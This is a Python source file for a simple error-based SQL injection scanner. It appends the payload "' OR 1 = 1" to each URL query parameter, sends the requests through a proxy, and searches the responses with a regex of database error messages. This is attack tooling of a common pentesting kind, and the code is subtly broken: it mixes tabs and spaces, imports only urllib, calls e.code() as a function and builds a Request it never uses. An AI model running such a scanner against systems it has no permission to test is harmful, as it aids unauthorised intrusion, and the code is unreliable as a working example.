import urllib
import re
import settings


def injector(url, payloads, check):
		
		with urllib.request.urlopen(url) as response:
		    html = response.read()
		    vuln = 0
		    print(" [*] " + url)
		    print(" [*] Page response code: " + str(response.code))
		    if response.code == 200:
		        for params in url.split("?")[1].split("&"):
		            print("  > Testing param: " + str(params))
		            for payload in payloads:
					    
		                print(" [!] Proxy On: 127.0.0.1:8080")
		                # Using a proxy
		                proxy = urllib.request.ProxyHandler({'http': settings.settings["proxy"]})
		                # construct a new opener using your proxy settings
		                opener = urllib.request.build_opener(proxy)
		                # install the openen on the module-level
		                urllib.request.install_opener(opener)
						
		                injected_url = url.replace(params, params + str(payload).strip())
		                inj_req = urllib.request.Request(injected_url)
		                try:
		                    inject = urllib.request.urlopen(injected_url)
		                except urllib.error.HTTPError as e:		                
		                    print(" [!] Error. Exit code " + str(e.code()))
		                    exit()
		                with inject as inj_response:
		                    if inj_response.code == 200:
		                        inj_html = inj_response.read()
		                        print(" [*] Inj_Page response code " + str(inj_response.code))
		                
		                        for line in inj_html.splitlines():
		                            checker = re.findall(check, str(line))
		                            if len(checker) !=0:
		                                print(" [*] Payload Found . . .")
		                                print(" [!] Code Snippet: "  + str(line).strip())
		                                vuln+=1
				    
		if vuln == 0:                
		    print(" [!] Target is not vulnerable!")
		else:
		    print(" [!] Congratulations you've found %i bugs :-) " % (vuln) )

def error_based_sqli_func(url):
    print("\n [!] Now Scanning for Error Based SQL Injection ")
    print(" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
    print(" [!] Please wait ....")
    
    payloads = ["' OR 1 = 1"]
    check = re.compile("Error: You have an error in your SQL syntax|Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    injector(url, payloads, check)
